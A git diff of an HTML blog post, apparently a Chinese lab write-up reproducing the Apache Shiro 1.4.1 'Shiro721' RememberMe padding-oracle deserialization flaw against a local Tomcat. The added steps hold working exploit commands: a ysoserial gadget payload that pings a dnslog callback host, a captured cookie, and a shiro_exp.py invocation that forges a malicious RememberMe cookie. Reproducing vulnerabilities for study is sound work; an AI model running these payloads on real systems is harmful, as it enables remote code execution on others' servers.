@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1.7k</span> / Reading time: <span class="post-count">6 min</span></span>
+                        <span>Word count: <span class="post-count">1.8k</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -474,10 +474,17 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.4.1</span><br></pre></td></tr></table></figure>
 <p>启动IDEA，配置tomcat（别用最新的版本的tomcat，容易出错）<br>并设置 samples-web:war 作为 Artifacts<br>然后启动tomcat</p>
 <p><img src="/2021/06/01/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="shiro721漏洞复现"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1、首先通过 YSoSerial 生成可利用的 Payload . 由于之前配置 pom.xml 时没有添加任何组件 , 所以我们使用 URLDNS Payload 来探测漏洞是否存在</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1、首先通过 YSoSerial 生成可利用的 Payload . 由于之前配置 pom.xml 时没有添加任何组件 , 所以使用 URLDNS Payload 来探测漏洞是否存在</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;ping milon0.ceye.io&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>
 
-<p>2、</p>
+<p>2、获取一个有效的Remember Cookie</p>
+<p><img src="/2021/06/01/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="shiro721漏洞复现"></p>
+<p><img src="/2021/06/01/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="shiro721漏洞复现"></p>
+<p>此处注意删除JSESSIONID，否则后续无法利用</p>
+<p>3、通过 Padding Oracle Attack 生成 Evil Rememberme cookie:<br>注意：此exp爆破时间较长，建议使用 <code>ysoserial</code> 生成较短的 payload 验证（eg: ping 、 touch /tmp/success, etc），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py</span><br><span class="line">Usage: shiro_exp.py &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;</span><br><span class="line">python shiro_exp.py http:&#x2F;&#x2F;localhost:8080&#x2F;samples_web_war&#x2F;home.jsp xSEnrD1VPnQ49Tke8d9s7yXyBdKmcZTvF5KZ+8trI5&#x2F;CQNSwsTJPlfBIEWj4ewouARb8LY4n1BQClrG6+Y5NsyyRhJwjbMKP9DenW7Dd78k9xeWfQZStuyyVsPG3Yq+fAgisJZ706Nzl0Sc2BsoA4COM2Frj5H4Tu3XQr3yer4lQawGdQPT8UCj4XqzuU9xgmmAWzlfEBe0f217&#x2F;rhFF0dtLogcX7Jw1E0Q5xnoiiEf1Q76ynr&#x2F;wKb74FqS0UfCHj67lE7yYYd1cjRw4IuM2c&#x2F;JGppP5rMbuq7Nb5D&#x2F;UrkMv&#x2F;Cqv777YbQx90QjGw50v13NPjfoki6lgqwaI+woUh4thZQM6mHHTvE+A2S&#x2F;a1sNJhYodne&#x2F;9BQx5iONqjICnGRC5om9IG9XAm+lJ6ED6P1xxSqFNiXWh7JqCFk7YeEwpZoqLYR8EYq+uxqyOwsagOQSYnHVIzNkIcuNcvjBkDtRf37+T&#x2F;0n0yz&#x2F;8I3gYL+sV4eOh5ITXpKHTKdprKof4 payload.class</span><br></pre></td></tr></table></figure>
+
+<p>4、使用Evil Rememberme cookie 认证进行反序列化攻击，即可在dnslog平台获取记录。</p>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-%e5%88%86%e6%9e%90-%e4%b8%8a/" target="_blank" rel="noopener">CVE-2019-12422 Shiro721 分析[ 上 ]</a></p>
 
     </article>
